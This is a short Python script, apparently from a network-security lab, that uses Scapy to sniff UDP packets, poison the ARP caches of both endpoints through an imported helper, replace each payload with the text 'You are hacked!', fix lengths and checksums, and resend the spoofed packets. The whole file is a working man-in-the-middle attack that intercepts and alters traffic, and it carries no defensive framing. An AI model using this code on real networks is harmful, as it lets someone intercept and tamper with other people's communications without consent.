from scapy.all import *
from arp_poisioning import *

def intercept_packet(pkt) -> None:
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    print("Intercepted UDP Packet from %s to %s" % (ip_src, ip_dst))
    ip = IP(src=ip_src, dst=ip_dst)

    pkt[UDP].payload = Raw("You are hacked!")
    spoofed_pkt = ip / pkt[UDP]
    print(spoofed_pkt)
    '''
    This small section here is to recalculate the length and checksum of the packet.
    Without the 4 lines below, this was not working... It took me hours of research for this.
    '''
    del spoofed_pkt[IP].len
    del spoofed_pkt[IP].chksum
    del spoofed_pkt[UDP].len
    del spoofed_pkt[UDP].chksum
    mac_1 = find_mac(ip_src)
    mac_2 = find_mac(ip_dst)
    poison_cache(ip_src,mac_1,ip_dst,mac_2)
    send(spoofed_pkt, count=4)

sniff(iface="h3-eth0",filter="udp", prn=intercept_packet, count=4)
